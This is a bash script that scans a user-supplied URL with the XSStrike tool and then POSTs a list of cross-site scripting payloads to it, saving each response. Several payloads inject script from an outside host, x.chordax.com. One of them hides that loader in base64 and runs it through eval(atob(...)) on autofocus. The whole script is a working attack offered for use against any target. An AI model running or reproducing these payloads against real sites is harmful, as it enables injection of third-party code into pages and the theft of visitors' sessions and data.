#!/bin/bash

# Check if python3 is installed
if ! command -v python3 &> /dev/null; then
    echo "Python3 is not installed. Please install Python3."
    exit 1
fi

# First scans a single target using XSStrike
read -p "Enter the target URL: " targetURL
python3 xsstrike.py -u "$targetURL"

# Ask the user for the mode: Blind XSS or Slow Fuzz
echo "Choose a mode:"
echo "1. Blind XSS"
echo "2. Slow Fuzz"
read -p "Option: " mode

# Use Blind XSS mode
if [ "$mode" -eq 1 ]; then
    python3 xsstrike.py -u "$targetURL" --crawl --blind

# Use Slow Fuzz mode
elif [ "$mode" -eq 2 ]; then
    python3 xsstrike.py -u "$targetURL" --fuzzer
fi

# Payload options
payloads=(
    '"><script src="https://x.chordax.com"></script>'
    'javascript:eval("var a=document.createElement(\'script\');a.src=\'https://x.chordax.com\';document.body.appendChild(a)")'
    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veC5jaG9yZGF4LmNvbSI7ZG9jdW1lbnQuYXBwZW5kQ2hpbGQoYSk7 autofocus>'
    '"><iframe srcdoc="...">'
    '<script>$.getScript("https://x.chordax.com")</script>'
)

# Output file for curl commands
curlCommandsFile="curl_commands.txt"

# Loop through each payload option
for ((i=0; i<${#payloads[@]}; i++)); do
    payload="${payloads[$i]}"
    
    # Output the individual curl command to the file
    echo "curl -X POST -d \"param1=$payload\" \"$targetURL\" > response_payload_$((i+1)).txt" >> "$curlCommandsFile"

    # Send custom curl request with the current payload and save the response to a text file
    echo "Sending custom curl request with payload $((i+1)): $payload to $targetURL"
    curl -X POST -d "param1=$payload" "$targetURL" > "response_payload_$((i+1)).txt"
    echo "Response saved to response_payload_$((i+1)).txt"
done

echo "Curl commands saved to $curlCommandsFile"